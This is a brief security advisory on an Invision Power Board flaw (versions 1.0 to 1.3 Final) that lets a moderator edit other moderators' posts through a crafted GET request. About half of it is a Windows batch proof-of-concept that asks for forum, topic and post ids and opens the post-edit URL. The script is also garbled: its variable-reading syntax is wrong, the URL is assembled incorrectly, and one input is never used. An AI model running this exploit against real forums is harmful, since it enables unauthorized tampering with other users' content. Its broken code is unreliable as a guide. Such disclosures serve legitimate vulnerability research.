source: http://www.securityfocus.com/bid/13802/info

Invision Power Board is affected by an unauthorized access vulnerability.

Reportedly, a moderator can edit forum posts owned by other moderators through an HTTP GET request without providing sufficient authentication credentials.

Invision Power Board versions 1.0 to 1.3 Final are reportedly affected by this vulnerability. 

echo off
cls
title Ipb Edit Bug
color a
echo enter url(example:www.example.com):
set /p %url%=
echo enter Folder(example:/forums):
set /p %Folder%=
echo enter Forum id(example:5) you are moderating:
set /p %forumid%=
echo enter topic id(example:103226) you want to edit:
set /p %topicid%=
echo enter p=num(example:760594) id you want to edit:
set /p %pnum%=
echo enter any key to go the edit post page...
pause
start iexplore.exe %url%forumid%/index.php?act=Post&CODE=08&f=%forumid%&t=%topicid%&p=%pnum% 
